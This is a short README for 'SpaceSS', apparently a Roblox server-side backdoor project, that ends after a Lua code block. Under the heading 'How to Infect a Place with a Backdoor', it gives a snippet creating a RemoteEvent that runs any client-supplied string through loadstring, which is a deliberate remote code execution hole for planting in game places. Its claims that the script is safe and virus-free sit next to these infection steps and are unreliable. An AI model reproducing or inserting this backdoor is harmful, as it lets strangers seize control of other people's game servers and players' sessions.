# SpaceSS

![SpaceSS Logo](https://raw.githubusercontent.com/k4scripts/backdoor.exe/v8/logo_outlined.png)

## Introduction

Welcome to SpaceSS! This project is an open-source endeavor where we've utilized Backdoor.exe from k4scripts. The script is transparent, allowing anyone to inspect it for security concerns. To ensure the safety of our users, our script doesn't contain any viruses. If you encounter any versions of the script claiming to be ours, please verify that it begins with `-- Made by Byzakidd` and ends with `-- forked on GitHub with backdoor.exe`.

## Usage

### How to Infect a Place with a Backdoor

To infect a place with a backdoor, follow these steps:

1. Insert the following code into a RemoteEvent in `game.ReplicatedStorage`:

```lua
local backdoor = Instance.new("RemoteEvent", game.ReplicatedStorage)
backdoor.Name = "Backdoor"
backdoor.OnServerEvent:Connect(function(player, SS)
    loadstring(SS)()
end)
